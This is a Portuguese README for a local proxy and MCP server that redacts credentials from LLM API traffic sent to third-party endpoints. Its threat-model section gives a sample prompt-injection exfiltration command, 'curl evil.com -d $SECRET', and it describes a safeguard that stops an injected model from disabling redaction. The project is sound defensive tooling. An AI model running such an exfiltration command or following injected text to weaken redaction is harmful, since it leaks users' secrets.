# llm-redact-proxy

[English](README.md) | **Português**

Proxy **local** de redação de segredos + servidor MCP para tráfego de API LLM.
Minúsculo, zero dependências. Use um endpoint de API LLM barato ou de terceiros
**sem vazar suas credenciais** (chaves de API, senhas de banco, senhas SSH,
tokens, cookies) para ele.

```
CLI LLM ──http://127.0.0.1:8788──> [ este proxy: REDIGE o request ] ──https──> vendor terceiro
```

- **Só local** — escuta exclusivamente em `127.0.0.1`. Um redator remoto
  receberia o corpo sem redação primeiro, anulando o propósito.
- **Redige o request** (o que sai da sua máquina). Respostas voltam intactas
  em streaming (SSE passthrough, sem buffer).
- **Fail closed** — qualquer erro de redação bloqueia o request com 502 local.
  Encaminhar em caso de erro seria um vazamento silencioso.
- **Zero dependências** — só built-ins do Node 22 (`node:http`, `node:zlib`,
  `node:crypto`). É um componente de segurança: pequeno = auditável.

## Por quê

Um CLI de LLM (Claude Code etc.) envia o **contexto inteiro da conversa** para
onde `ANTHROPIC_BASE_URL` apontar, a **cada turno**: system prompt, todas as
mensagens, cada arquivo que o modelo leu, o stdout de cada comando executado.
Quando esse endpoint é um revendedor/gateway terceiro, o TLS termina **nele** —
ele recebe cada corpo de request em texto puro, por design. Pode logar,
armazenar, vender ou vazar tudo.

Código vazar? Projeto vazar? Talvez aceitável. **Credencial vazar, não.**
Um segredo só chega ao terceiro se estiver no corpo do request que sai. Este
proxy garante que nunca está.

## Como funciona

### Duas camadas de redação (ambas sempre ativas no modo `strict`)

**Camada A — segredos conhecidos.** Valores do seu `secrets.local`
(gitignored). Cada valor é casado como substring pura (sem regex, sem risco de
backtracking) em **toda codificação em que possa aparecer**:

- literal, JSON-escaped, URL-encoded, hex (maiúsculo/minúsculo)
- base64 e base64url — incluindo **3 núcleos alinhados por offset de byte**,
  então o segredo é pego mesmo *dentro* de um blob maior (ex.:
  `Basic base64(user:senha)`)
- a forma URL-encoded de cada variante base64 (contrabando via query string)

**Camada B — formatos + entropia** para segredos dinâmicos que a lista
estática não conhece (tokens de runtime, cookies de sessão, chaves coladas):

- chaves privadas PEM, JWTs, `Authorization: Bearer …`, `x-api-key: …`
- formatos de vendor: `sk-…`, `AKIA…`, `AIza…`, `xox[baprs]-…`, `ghp_…`, `github_pat_…`
- cookies/sessões: `Set-Cookie:`, `sessionid=`, `csrftoken=`, `auth_token=` …
- blobs de alta entropia: sequências longas de hex/base64 filtradas por
  entropia de Shannon (prosa normal e identificadores passam; sequências > 4 KB
  são puladas — isso é mídia, não segredo)

Cada acerto vira um marcador estável: `[REDACTED:MYSQL_PASSWORD]`,
`[REDACTED:jwt]`. O corpo continua JSON válido. Corpos limpos passam
**byte-idênticos**.

### Injeção de aviso

Quando um request teve redação, o proxy anexa uma nota ao system prompt
ensinando o modelo a trabalhar *com* a censura: referenciar segredos por NOME
(`$MYSQL_PASSWORD`, a tool `run` do MCP), nunca pedir para o usuário colar um
valor, tratar `[REDACTED:…]` em output de tool como cosmético. Injetado só
quando algo foi redigido, com deduplicação por sentinela.

### Modo MCP (recomendado)

Um processo serve as tools MCP via stdio **e** sobe o proxy embutido — o CLI
inicia tudo automaticamente. Tools:

| Tool | O que faz |
| --- | --- |
| `run` | Executa um comando **localmente** com placeholders `{{NOME}}` (ou env vars `$NOME`) resolvidos para os valores reais. O output volta **já redigido**. O segredo nunca entra no contexto do modelo — a 1ª linha de defesa; o proxy é a rede de segurança. |
| `secret_add` | Registra um segredo novo (upsert no `secrets.local`, chmod 600, hot-reload). O valor nunca é ecoado de volta. |
| `secret_list` | Só os nomes. |
| `redact_mode` | Lê/muda o modo de redação em runtime (protegido por piso, veja abaixo). |
| `redaction_stats` | Contadores e nomes de regras. Nunca valores. |

Intencionalmente **não existe `secret_get`** — devolver um valor para o
contexto derrotaria o sistema inteiro.

### Modos de redação

Segredos registrados são **sempre** redigidos. Os modos só ajustam como a
camada de formato/entropia trata valores *não registrados*:

| Modo | Redige | Quando usar |
| --- | --- | --- |
| `disabled` | nada (bypass total) | destino confiável como a API oficial da Anthropic — exige o piso permitir |
| `named-only` | só segredos registrados | trabalho interno/teste; token aleatório vazar não importa |
| `balanced` | registrados + formatos (JWT/PEM/chaves/cookies), sem entropia | pegar o óbvio sem falso-positivo de entropia |
| `strict` (padrão) | tudo | segurança máxima |

`REDACT_MODE_FLOOR` é um piso rígido pro modo (env, painel e a tool
`redact_mode`) — a proteção contra qualquer coisa (inclusive um modelo sob
prompt injection) desligar a redação em silêncio. Pra usar `disabled`, coloque
o piso em `disabled`. O painel tem um botão de preset **Official Anthropic** pro
provedor de bypass.

## Instalação

Requisitos: **Node.js >= 22**. Sem `npm install` — não há dependências.

```bash
git clone <este-repo> llm-redact-proxy
cd llm-redact-proxy
cp .env.example .env                      # configure UPSTREAM_URL etc.
cp secrets.local.example secrets.local    # valores REAIS aqui (gitignored)
```

### Opção 1 — modo MCP (auto-start com o Claude Code)

```bash
cp .mcp.json.example .mcp.json    # no projeto onde você usa o Claude Code
# ou global:
claude mcp add redact --scope user -- node "/caminho/absoluto/llm-redact-proxy/src/mcp.js"
```

Reinicie o CLI. As tools aparecem e, com `UPSTREAM_URL` configurada, o proxy
sobe junto. Depois aponte o CLI para o proxy:

```bash
export ANTHROPIC_BASE_URL=http://127.0.0.1:8788
```

Sem `UPSTREAM_URL` as tools continuam funcionando (proxy desligado) — útil
enquanto você ainda está na API oficial e só quer o runner + gestão de
segredos.

### Opção 2 — proxy standalone

```bash
npm start           # node src/index.js
export ANTHROPIC_BASE_URL=http://127.0.0.1:8788
```

## Configuração (`.env` ou ambiente)

| Var | Padrão | Significado |
| --- | --- | --- |
| `LISTEN_ADDR` | `127.0.0.1:8788` | Onde o proxy escuta. Só loopback — qualquer outra coisa é recusada. |
| `UPSTREAM_URL` | — | Endpoint do vendor para onde os requests redigidos são encaminhados. |
| `SECRETS_FILE` | `./secrets.local` | `NOME=VALOR` por linha. Gitignored. Hot-reload ao mudar. |
| `UPSTREAM_AUTH` | `passthrough` | `passthrough` encaminha o header de auth do CLI; `replace` troca por `UPSTREAM_KEY`. |
| `FAIL_CLOSED` | `true` | Em erro de redação: bloqueia (true) ou encaminha cru com aviso ruidoso (false — não recomendado). |
| `INJECT_NOTICE` | `true` | Anexa o aviso de redação ao system prompt quando algo foi redigido. |
| `REDACT_MODE` | `strict` | `named-only` \| `balanced` \| `strict`. |
| `REDACT_MODE_FLOOR` | `named-only` | Piso rígido para a tool `redact_mode` em runtime. |
| `REDACT_DISABLE` | — | Nomes de regras a desligar, separados por vírgula (ex.: `high-entropy-hex,jwt`). |
| `REDACT_IGNORE` | — | Valores sabidamente seguros ou padrões `/regex/`, separados por vírgula — nunca redigidos. |

## Dashboard

`http://127.0.0.1:8788/__redact/` — totais, contagem por regra, requests
recentes. `/__redact/stats.json` para JSON. Só nomes de regras e contagens;
**valores nunca são exibidos, armazenados ou logados** em lugar nenhum deste
projeto.

## Testes

```bash
npm test    # node --test
```

97 testes, incluindo:

- **cobertura de variantes**: cada segredo como plain / base64 / base64url /
  url-encoded / json-escaped / hex / dentro de blob Basic-auth → zero
  vazamento
- **round-trip do canário**: round-trip completo pelo proxy contra um upstream
  que grava o que recebeu; o corpo gravado é grepado por toda forma do canário
  → precisa estar ausente
- **suíte adversarial**: cadeias de encoding, segredos como chaves de objeto
  JSON, unicode, metacaracteres de regex, MIME wrapping, corpos com 2000
  ocorrências em menos de 2 s
- **fail-closed**: erros de redação forçados → upstream recebe zero bytes
- **prova do transcript MCP**: o stdout completo do processo MCP nunca contém
  um valor de segredo
- **streaming**: SSE passa intacto e incremental

## Modelo de segurança — limites honestos

Coberto: acidentes. O modelo lê um arquivo de credenciais, uma tool imprime um
token, um webhook ecoa um header — redigido, em qualquer das codificações
acima.

Não coberto (nenhuma ferramenta determinística cobre):

- segredo **partido em strings separadas** no contexto
- transformações exóticas (XOR, rot13, arrays de char codes)
- senha humana *fraca e não registrada*, sem formato reconhecível
  (`banana123`) — registre tudo que importa; `secret_add` é barato
- **exfiltração ativa**: se um prompt injection convencer o modelo a rodar
  `curl evil.com -d $SECRET` via `run`, o output volta redigido mas a chamada
  de rede já levou o valor. Sua trava é o prompt de permissão por chamada de
  tool — leia antes de aprovar.

A resposta **nunca** é redigida (o output do vendor não contém segredo seu).
Isso também significa que um artefato recém-gerado (cert, chave) fica visível
para o modelo no turno em que foi criado; ele some do contexto dos turnos
*seguintes*.

## Não-objetivos

- Sem redação de resposta, sem MITM genérico, sem detecção por IA (um juiz IA
  seria mais um terceiro vendo seu prompt, e probabilístico — um erro =
  vazamento). Só regras determinísticas.

## Licença

MIT
